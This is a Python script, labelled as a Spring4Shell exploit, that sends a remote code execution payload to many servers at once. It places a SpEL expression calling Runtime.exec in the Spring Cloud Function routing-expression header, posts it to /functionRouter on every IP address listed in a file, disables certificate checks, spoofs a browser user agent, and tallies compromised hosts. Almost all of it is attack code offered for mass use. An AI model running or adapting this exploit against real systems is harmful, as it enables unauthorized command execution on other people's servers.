# MADE BY NRPE | SPRING4SHELL #

import concurrent.futures
import sys
import requests
import logging
import re
from functools import partial
from requests.auth import HTTPBasicAuth

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def sanitize_command(command):
    return re.sub(r'[^a-zA-Z0-9_\-;]', '', command)

def rce(ip_address, cmd):
    payload = f'T(java.lang.Runtime).getRuntime().exec("{cmd}")'
    url = f"http://{ip_address}/functionRouter"
    headers = {
        'spring.cloud.function.routing-expression': payload,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    return url, headers

def send_post_request(ip_address, cmd):
    url, headers = rce(ip_address, cmd)
    data = 'd'
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
    try:
        response = requests.post(url, headers=headers, data=data, verify=False, timeout=3)
        if response.status_code == requests.codes.ok:
            logging.info(f"Exploit Sent To {ip_address}")
            return True 
        else:
            logging.warning(f"Exploit To {ip_address} Failed with status code: {response.status_code}")
            return False
    except requests.RequestException as e:
        logging.error(f"Error sending request to {ip_address}: {e}")
        return False

def worker(ip_address, cmd):
    return send_post_request(ip_address, cmd)

def main():
    ip_file = "ips.txt"
    cmd = "enter command here"
    sanitized_cmd = sanitize_command(cmd)

    try:
        with open(ip_file, "r") as file:
            ip_addresses = [ip.strip() for ip in file.readlines() if ip.strip()]
    except FileNotFoundError:
        logging.error(f"File {ip_file} not found.")
        sys.exit(1)

    success_count = 0
    failure_count = 0

    with concurrent.futures.ThreadPoolExecutor(max_workers=None) as executor:
        futures = {executor.submit(partial(worker, cmd=sanitized_cmd), ip_address): ip_address for ip_address in ip_addresses}

        for future in concurrent.futures.as_completed(futures):
            ip_address = futures[future]
            if future.result():
                success_count += 1
            else:
                failure_count += 1

    logging.info(f"Finished processing IPs: {success_count} succeeded, {failure_count} failed.")

if __name__ == "__main__":
    main()
